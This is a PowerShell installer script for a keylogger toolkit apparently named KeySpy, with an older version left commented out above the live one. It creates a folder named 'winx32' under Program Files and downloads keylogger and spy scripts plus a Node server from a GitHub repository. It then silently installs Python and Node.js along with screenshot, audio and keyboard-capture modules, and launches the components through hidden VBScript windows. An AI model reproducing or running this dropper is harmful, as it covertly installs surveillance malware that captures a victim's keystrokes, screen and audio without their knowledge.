# # Create directory if it doesn't exist
# $winx32Folder = "C:\Program Files (x86)\winx32"
# if (-not (Test-Path $winx32Folder)) {
#     New-Item -Path $winx32Folder -ItemType Directory -Force
# }

# # Define file URLs
# $kSpyUrl = "https://raw.githubusercontent.com/3rr0r-505/KeySpy/main/src/gl0bal/kSpy.py"
# $keyloggerUrl = "https://raw.githubusercontent.com/3rr0r-505/KeySpy/main/src/gl0bal/keylogger.py"
# $pyDuckyUrl = "https://raw.githubusercontent.com/3rr0r-505/KeySpy/main/src/gl0bal/pyDucky.py"

# # Download the Python files
# Invoke-WebRequest -Uri $kSpyUrl -OutFile (Join-Path -Path $winx32Folder -ChildPath "kSpy.py")
# Invoke-WebRequest -Uri $keyloggerUrl -OutFile (Join-Path -Path $winx32Folder -ChildPath "keylogger.py")
# Invoke-WebRequest -Uri $pyDuckyUrl -OutFile (Join-Path -Path $winx32Folder -ChildPath "pyDucky.py")

# # Check if Python is installed
# $pythonPath = Get-Command python -ErrorAction SilentlyContinue
# if (-not $pythonPath) {
#     # Download and install Python
#     $pythonInstallerUrl = "https://www.python.org/ftp/python/3.10.4/python-3.10.4-amd64.exe"
#     $pythonInstallerPath = Join-Path -Path $winx32Folder -ChildPath "python-installer.exe"
#     Invoke-WebRequest -Uri $pythonInstallerUrl -OutFile $pythonInstallerPath

#     # Install Python silently
#     Start-Process -FilePath $pythonInstallerPath -ArgumentList "/quiet InstallAllUsers=1 PrependPath=1" -Wait
# }

# # Install required Python modules
# $modules = "pyscreenshot==2.1", "sounddevice==0.4.1", "pynput==1.7.3", "pygetwindow==0.0.9", "pymongo==3.12.0", "pyautogui==0.9.53"
# foreach ($module in $modules) {
#     & python -m pip install $module -q
# }

# # Run kSpy.py
# $kSpyPath = "C:\Program Files (x86)\winx32\kSpy.py"
# python $kSpyPath



# # Create directory if it doesn't exist
# $winx32Folder = "C:\Program Files (x86)\winx32"
# if (-not (Test-Path $winx32Folder)) {
#     New-Item -Path $winx32Folder -ItemType Directory -Force
# }

# Define file URLs
$kSpyUrl = "https://raw.githubusercontent.com/3rr0r-505/KeySpy/main/src/gl0bal/kSpy.py"
$keyloggerUrl = "https://raw.githubusercontent.com/3rr0r-505/KeySpy/main/src/gl0bal/keylogger.py"
$pyDuckyUrl = "https://raw.githubusercontent.com/3rr0r-505/KeySpy/main/src/gl0bal/pyDucky.py"
$serverJsUrl = "https://raw.githubusercontent.com/3rr0r-505/KeySpy/main/src/gl0bal/server.js"
$runServerJSVbsUrl = "https://raw.githubusercontent.com/3rr0r-505/KeySpy/main/src/gl0bal/run-serverJS.vbs"  
$runKspyVbsUrl = "https://raw.githubusercontent.com/3rr0r-505/KeySpy/main/src/gl0bal/run-Kspy.vbs"  

# Download the Python files
Invoke-WebRequest -Uri $kSpyUrl -OutFile (Join-Path -Path $winx32Folder -ChildPath "kSpy.py")
Invoke-WebRequest -Uri $keyloggerUrl -OutFile (Join-Path -Path $winx32Folder -ChildPath "keylogger.py")
Invoke-WebRequest -Uri $pyDuckyUrl -OutFile (Join-Path -Path $winx32Folder -ChildPath "pyDucky.py")

# Download server.js
Invoke-WebRequest -Uri $serverJsUrl -OutFile (Join-Path -Path $winx32Folder -ChildPath "server.js")

# Check if Python is installed
$pythonPath = Get-Command python -ErrorAction SilentlyContinue
if (-not $pythonPath) {
    # Download and install Python
    $pythonInstallerUrl = "https://www.python.org/ftp/python/3.10.4/python-3.10.4-amd64.exe"
    $pythonInstallerPath = Join-Path -Path $winx32Folder -ChildPath "python-installer.exe"
    Invoke-WebRequest -Uri $pythonInstallerUrl -OutFile $pythonInstallerPath

    # Install Python silently
    Start-Process -FilePath $pythonInstallerPath -ArgumentList "/quiet InstallAllUsers=1 PrependPath=1" -Wait
}

# Check if Node.js is installed
$nodePath = Get-Command node -ErrorAction SilentlyContinue
if (-not $nodePath) {
    # Download and install Node.js
    $nodeInstallerUrl = "https://nodejs.org/dist/v16.14.0/node-v16.14.0-x64.msi"
    $nodeInstallerPath = Join-Path -Path $winx32Folder -ChildPath "node-installer.msi"
    Invoke-WebRequest -Uri $nodeInstallerUrl -OutFile $nodeInstallerPath

    # Install Node.js silently
    Start-Process -FilePath msiexec.exe -ArgumentList "/i $nodeInstallerPath /quiet" -Wait
}

# Install Express and Mongoose locally
Set-Location $winx32Folder
npm install express mongoose --save

# Download run-serverJS.vbs and run-second.vbs
Invoke-WebRequest -Uri $runServerJSVbsUrl -OutFile (Join-Path -Path $winx32Folder -ChildPath "run-serverJS.vbs")
Invoke-WebRequest -Uri $runKspyVbsUrl -OutFile (Join-Path -Path $winx32Folder -ChildPath "run-Kspy.vbs")

# Execute the VBScript files using cscript.exe
Start-Process cscript.exe -ArgumentList "//B //Nologo $(Join-Path -Path $winx32Folder -ChildPath 'run-serverJS.vbs');" -WindowStyle Hidden -Wait
Start-Process cscript.exe -ArgumentList "//B //Nologo $(Join-Path -Path $winx32Folder -ChildPath 'run-Kspy.vbs');" -WindowStyle Hidden -Wait
